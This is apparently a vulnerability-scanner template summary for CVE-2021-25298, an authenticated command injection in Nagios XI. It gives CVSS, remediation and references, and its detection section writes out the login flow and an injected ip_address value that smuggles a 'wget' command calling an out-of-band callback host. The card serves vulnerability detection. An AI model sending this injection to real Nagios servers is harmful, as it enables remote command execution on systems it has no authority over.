---
cve_id: CVE-2021-25298
template_path: nuclei-templates/http/cves/2021/CVE-2021-25298.yaml
affected_product: Nagios XI
severity: high
authentication: required
external_callback: true
affected_versions: 5.5.6 through 5.7.5
preconditions: []
poc_classification: rce
---

## Vulnerability
Nagios XI 5.5.6 through 5.7.5 is susceptible to authenticated remote command injection. There is improper sanitization of authenticated user-controlled input by a single HTTP request via the file `/usr/local/nagiosxi/html/includes/configwizards/cloud-vm/cloud-vm.inc.php`. This can lead to remote code execution, by which an attacker can execute malware, obtain sensitive information, modify data, and/or gain full control over a compromised system.

CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H (score 8.8). CWE-78. Impact: authenticated attacker executes arbitrary commands on the target system. Remediation: upgrade to patched version or apply vendor-supplied patch.

## PoC / Detection
Classification: rce

The template performs a multi-step authenticated flow: GET `/nagiosxi/login.php` to extract NSP token, POST `/nagiosxi/login.php` with `username`/`password` and NSP, GET `/nagiosxi/index.php` to extract authenticated NSP, then GET `/nagiosxi/config/monitoringwizard.php?update=1&nsp=...&nextstep=4&wizard=digitalocean&no_ssl_verify=1&ip_address=127.0.0.1;%20wget%20{{interactsh-url}};%20` (20s timeout). It verifies via DNS interaction on interactsh and presence of "Connection Information" + "Host Check" in body_4 (status 200).

## References
- https://github.com/fs0c-sh/nagios-xi-5.7.5-bugs/blob/main/README.md
- https://github.com/rapid7/metasploit-framework/pull/17494
- http://nagios.com
- https://nvd.nist.gov/vuln/detail/CVE-2021-25298
- http://packetstormsecurity.com/files/170924/Nagios-XI-5.7.5-Remote-Code-Execution.html
